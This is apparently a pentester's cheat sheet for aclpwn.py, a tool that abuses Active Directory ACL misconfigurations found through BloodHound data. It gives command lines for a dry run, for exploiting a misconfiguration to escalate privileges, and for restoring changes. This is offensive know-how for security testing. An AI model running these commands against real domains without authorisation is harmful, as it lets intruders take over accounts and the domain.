### Source
https://github.com/fox-it/aclpwn.py  

### Only show the escalation path and do not attempt to exploit
```
python3 aclpwn.py -f <user> -ft <userType> -d <domain> -dry
```

### Arguments
```
-f = the owned user or computer
-ft = user or computer
-t = the target object (given user will be added to this object) 
-u = user to add to object
-tt = type of the destination object (user, group, domain or computer)
```

### Exploit misconfiguration
```
python3 aclpwn.py -f <user> -ft <userType> -t <targetObject> -tt <typeOfObject> -d <domain> -du ne04j -dp <bloodhoundPw> -u <user>
```

### Restore privileges (restore file will automatically be generated while exploiting, use --server if domain controller can not be resolved)
```
python3 aclpwn.py --restore <file>.restore
```

